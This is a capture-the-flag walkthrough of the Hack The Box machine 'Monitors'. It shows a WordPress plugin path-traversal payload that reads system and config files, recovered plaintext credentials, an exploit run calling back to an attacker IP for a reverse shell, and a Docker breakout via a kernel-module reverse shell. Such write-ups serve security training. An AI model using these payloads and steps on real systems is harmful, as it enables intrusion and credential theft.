 ![image](https://user-images.githubusercontent.com/68326057/117559351-2b257e00-b0a2-11eb-8cec-7e2770921cf5.png)


# NMAP

```bash
PORT   STATE SERVICE REASON  VERSION

22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5AeQDHYQGVg8GiNvPYiXYPseampZJusZb2Dbd2d1QIi7a/LGOO9ylbMgjxcve5euzCFBMSX2rVIp8zkUg3CCi7JYLpyQAeP0npjT/fB84dWbzt51Xmfir4qZTpBMf8Lw+ZFxEXv1UkGfejSZ3fjcuZ2hBBeUh63P2qcomVla/eUyR1dOIvJy8K1pl1WSXia6W2fJsBj/uowwe4+aMtWGVlzMNd+Tpp1Z8lg/a2jZTxkdIYvUkx/k0x0xrjsUhGiLgOoAWg4JvKeYoy+v/hhAjh6fB8Kw7jS1t1Si69cPadEQGB8NOMdyDv4EvoG3/8BvLpMgpHKzy1aHsJk9zqyej
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHKAgNKkq5XDcAfsuuxZFMPf+iEHjoq9DUmOmg0cCDgpE90GNOZeoaI24IlwlrSdTWTRA9HNJ7DFyIkcHr37Dk=
|   256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBi/L9gWCzbJ6GzFB1PsHZJco24eJW3wmC+a4Ul6fEe6

80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# WEB

![image](https://user-images.githubusercontent.com/68326057/117559412-ab4be380-b0a2-11eb-9019-c8633ef32ef0.png)

```bash
website administrator: admin@monitors.htb
```
## CMS - Wordpress

--> By admin | 15 October 2020 

![image](https://user-images.githubusercontent.com/68326057/117559478-58bef700-b0a3-11eb-980e-bc070df9efb9.png)

```bash
admin:
```

![image](https://user-images.githubusercontent.com/68326057/117559485-65434f80-b0a3-11eb-9347-def9130f7113.png)

```bash
plugin:wp-with-spritz
```

![image](https://user-images.githubusercontent.com/68326057/117559533-cc610400-b0a3-11eb-8830-0c0b197ac781.png)



# LFI

--> view-source:http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd

![image](https://user-images.githubusercontent.com/68326057/117559559-fb777580-b0a3-11eb-809b-0c4b5c640c6c.png)

![image](https://user-images.githubusercontent.com/68326057/117559568-092cfb00-b0a4-11eb-85dd-8bc601e09dd6.png)


--> view-source:http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//var/www/wordpress/wp-config.php

![image](https://user-images.githubusercontent.com/68326057/117559602-57da9500-b0a4-11eb-8a3e-673e6e728a1d.png)


```bash
wpadmin:BestAdministrator@2020!
```

![image](https://user-images.githubusercontent.com/68326057/117559862-88bbc980-b0a6-11eb-8ea6-266ac03a837c.png)


![image](https://user-images.githubusercontent.com/68326057/117559873-9ec98a00-b0a6-11eb-9975-63ca7507775e.png)


![image](https://user-images.githubusercontent.com/68326057/117559901-cddffb80-b0a6-11eb-8933-0e73c3029aa8.png)


```bash
admin(That we found at the start):BestAdministrator@2020!
```

![image](https://user-images.githubusercontent.com/68326057/117560003-96be1a00-b0a7-11eb-96e6-38fff4c5e54b.png)

![image](https://user-images.githubusercontent.com/68326057/117560646-43e76100-b0ad-11eb-9be6-dc2e12fca102.png)

![image](https://user-images.githubusercontent.com/68326057/117560658-65484d00-b0ad-11eb-8693-55920c6582d9.png)

```bash
 python3 exploit.py -t 'http://cacti-admin.monitors.htb' -u admin -p 'BestAdministrator@2020!' --lhost 10.10.14.21 --lport 9001
 ```
 
![image](https://user-images.githubusercontent.com/68326057/117560704-ae989c80-b0ad-11eb-9424-d6b5907dde9e.png)

# USER -www data


![image](https://user-images.githubusercontent.com/68326057/117560715-cb34d480-b0ad-11eb-8d74-67191db67ff3.png)

![image](https://user-images.githubusercontent.com/68326057/117560727-df78d180-b0ad-11eb-8e3c-a53bad80e72b.png)


```sql
mysql -D wordpress -u wpadmin -e 'select * from wp_users;' -p
<ordpress -u wpadmin -e 'select * from wp_users;' -p
BestAdministrator@2020!

+----+------------+------------------------------------+---------------+-------------------+---------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url            | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+-------------------+---------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$Be7cx.OsLozVI5L6DD60LLZNoHW9dZ0 | admin         | admin@monitor.htb | http://192.168.1.40 | 2020-10-15 13:45:42 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+-------------------+---------------------+---------------------+---------------------+-------------+--------------+

```

# KERNEL CVE

![image](https://user-images.githubusercontent.com/68326057/117560913-b6f1d700-b0af-11eb-8462-350742a5f708.png)

On victim machine:-
![image](https://user-images.githubusercontent.com/68326057/117560920-c7a24d00-b0af-11eb-8792-efdd9b5f68d6.png)

From my machine:-
```
nc -w 5 monitors.htb 4444 < exploit
```

DIDn't work

![image](https://user-images.githubusercontent.com/68326057/117561060-08e72c80-b0b1-11eb-8024-2d4b7bc6e476.png)


![image](https://user-images.githubusercontent.com/68326057/117561057-fa007a00-b0b0-11eb-9e23-49ff83cffdc7.png)

![image](https://user-images.githubusercontent.com/68326057/117561070-1ef4ed00-b0b1-11eb-8de5-3a832ccc5dfd.png)


![image](https://user-images.githubusercontent.com/68326057/117561083-37650780-b0b1-11eb-9dcf-2149b8636b03.png)


```bash
cacti_backup:VerticalEdge2020
```

![image](https://user-images.githubusercontent.com/68326057/117561092-4c419b00-b0b1-11eb-992f-d464a89f2306.png)


# USER - marcus

ssh in:-

![image](https://user-images.githubusercontent.com/68326057/117561112-772bef00-b0b1-11eb-96a4-8e8b92c68bf4.png)

![image](https://user-images.githubusercontent.com/68326057/117561135-a9d5e780-b0b1-11eb-9627-89d497bb6895.png)

![image](https://user-images.githubusercontent.com/68326057/117561143-bf4b1180-b0b1-11eb-9971-4653bbf6ace4.png)

![image](https://user-images.githubusercontent.com/68326057/117561146-ceca5a80-b0b1-11eb-80fe-99027e87a31f.png)

# ssh port forwarding

![image](https://user-images.githubusercontent.com/68326057/117561163-f7525480-b0b1-11eb-95e5-3740adc1b886.png)

![image](https://user-images.githubusercontent.com/68326057/117561230-895a5d00-b0b2-11eb-840d-a5f40bd4b0a2.png)

![image](https://user-images.githubusercontent.com/68326057/117561268-d5a59d00-b0b2-11eb-9577-052cca8fbc9b.png)

# In container

![image](https://user-images.githubusercontent.com/68326057/117561743-2ae3ad80-b0b7-11eb-9694-92dd880e943b.png)

--> https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd

![image](https://user-images.githubusercontent.com/68326057/117561873-1f44b680-b0b8-11eb-8e94-2a5b9fed8992.png)

--> capsh --print --> To check capabilities

--> c reverseshell

![image](https://user-images.githubusercontent.com/68326057/117561954-d17c7e00-b0b8-11eb-94f7-969d294f1b5a.png)

--> makefile

```bash
obj-m +=reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
--> wget both file and type make

![image](https://user-images.githubusercontent.com/68326057/117562014-5ebfd280-b0b9-11eb-8270-825a70fcec6f.png)

![image](https://user-images.githubusercontent.com/68326057/117562018-63848680-b0b9-11eb-9b6a-c0389da7f8aa.png)


# ROOT

![image](https://user-images.githubusercontent.com/68326057/117562023-7008df00-b0b9-11eb-98cf-1bbd8c87d3cb.png)


